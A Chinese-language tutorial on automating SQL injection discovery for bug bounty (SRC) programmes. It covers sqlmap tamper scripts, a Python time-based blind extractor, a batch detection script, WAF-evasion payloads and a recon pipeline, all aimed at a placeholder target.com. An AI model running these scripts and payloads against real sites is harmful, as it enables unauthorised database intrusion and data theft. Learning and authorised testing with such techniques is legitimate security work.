概述

SQL注入是最常见的Web安全漏洞之一。在SRC漏洞挖掘中，手动测试效率太低，需要构建自动化的工具链来提高效率。本文介绍从sqlmap到自定义脚本的完整自动化方案。

Sqlmap进阶

Sqlmap是最强大的SQL注入工具，但很多人只会基本用法。这里介绍一些进阶技巧。

1. 智能测试级别

# 默认测试（推荐）
sqlmap -u "http://target.com/page?id=1" --batch

# 完整测试（耗时较长）
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# 指定测试类型
sqlmap -u "http://target.com/page?id=1" --technique=BEU

参数说明：

  • --level：测试级别（1-5），级别越高测试越全面
  • --risk：风险等级（1-3），3会测试OR注入等可能破坏数据的方式
  • --technique：指定注入技术（B=布尔盲注，E=报错注入，U=联合查询）

2. 绕过WAF的Tamper脚本

# 使用tamper脚本绕过WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase

# 常用tamper组合
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase,charencode

# 查看所有tamper脚本
sqlmap --list-tampers

3. 批量测试

# 从文件读取URL列表
sqlmap -m urls.txt --batch --output-dir=./results

# 从Burp日志导入
sqlmap -l burp.log --batch

# 从请求文件测试
sqlmap -r request.txt --batch

自定义脚本

有时候sqlmap不够灵活，需要自定义脚本来处理特殊情况。

1. 基于时间的盲注脚本

import requests
import time

def time_based_sqli(url, payload_template, char_pos, ascii_val):
    """基于时间的盲注"""
    payload = payload_template.format(pos=char_pos, ascii=ascii_val)
    start = time.time()
    requests.get(url + payload, timeout=10)
    elapsed = time.time() - start
    return elapsed > 4  # 如果延迟超过4秒，说明条件为真

def extract_data(url, payload_template, max_len=50):
    """提取数据"""
    result = ""
    for i in range(1, max_len + 1):
        for ascii_val in range(32, 127):
            if time_based_sqli(url, payload_template, i, ascii_val):
                result += chr(ascii_val)
                print(f"Found: {result}")
                break
    return result

# 使用示例
url = "http://target.com/page?id=1"
payload = "' AND IF(ASCII(SUBSTRING((SELECT database()),{pos},1))={ascii},SLEEP(4),0)-- -"
db_name = extract_data(url, payload)
print(f"Database: {db_name}")

2. 批量检测脚本

import requests
import re

def check_sqli(url):
    """检测SQL注入"""
    payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(url + payload, timeout=5)
            if re.search(r"error|syntax|mysql|sql|warning", response.text, re.I):
                return True, payload
        except:
            pass
    return False, None

# 批量测试
urls = [
    "http://target.com/page?id=",
    "http://target.com/user?id=",
    "http://target.com/search?q="
]

for url in urls:
    vuln, payload = check_sqli(url)
    if vuln:
        print(f"[!] {url} - Vulnerable with: {payload}")
    else:
        print(f"[-] {url} - Not vulnerable")

WAF绕过技巧

1. 空格绕过

# 使用注释替代空格
'/**/OR/**/1=1

# 使用括号
'OR(1)=1

# 使用换行符
'%0AOR%0A1=1

2. 关键字绕过

# 大小写混合
'UnIoN sElEcT

# 双写关键字
'UNIUNIONON SELSELECTECT

# 使用内联注释
'/*!UNION*//*!SELECT*/

3. 编码绕过

# URL编码
%27%20OR%201%3D1

# 双重URL编码
%2527%2520OR%25201%253D1

# Unicode编码
' OR 1=1

自动化流程

构建完整的自动化测试流程：

1. 信息收集阶段

# 使用gospider爬取链接
gospider -s "http://target.com" -o output -c 10 -d 2

# 使用paramspider提取参数
paramspider -d target.com -o params.txt

# 使用waybackurls获取历史URL
echo "target.com" | waybackurls > wayback.txt

2. 参数筛选

# 筛选可能有注入的参数
grep "=" params.txt | grep -E "id|user|page|search|cat" > potential.txt

# 去重
sort -u potential.txt > unique.txt

3. 批量测试

# 使用自定义脚本批量测试
python3 batch_sqli.py -i unique.txt -o results.txt

# 使用sqlmap批量测试
sqlmap -m unique.txt --batch --output-dir=./results --threads=5

实战技巧

  • 先手动确认漏洞存在，再用自动化工具深入利用
  • 注意WAF的频率限制，适当降低线程数
  • 保存每次测试的结果，避免重复工作
  • 关注错误信息，可能泄露数据库结构
  • 测试完成后清理测试数据
